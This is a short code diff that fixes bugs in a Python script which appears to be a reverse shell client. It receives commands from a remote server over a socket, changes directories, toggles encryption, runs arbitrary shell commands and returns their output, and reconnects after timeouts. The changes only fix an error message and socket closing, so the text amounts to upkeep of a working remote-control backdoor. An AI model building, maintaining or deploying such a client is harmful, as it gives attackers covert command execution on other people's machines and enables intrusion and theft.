@@ -44,7 +44,7 @@ while True:
                     server.send('')
                 except:
                     # error by changing the directory
-                    server.send("Unable to enter the directory '" + cmd)
+                    server.send("Unable to enter the directory '" + cmd + "'\n")
             elif data.startswith('encryption '):
                 # encryption settings
                 if data.split(' ')[1] == 'on':
@@ -78,7 +78,7 @@ while True:
                 # run the command in the shell and send output
                 server.send(execShell(data))
         time.sleep(1)
-        s.close()
+        server.close()
         # timeout to reconnect
         time.sleep(10)
-s.close()
+server.close()
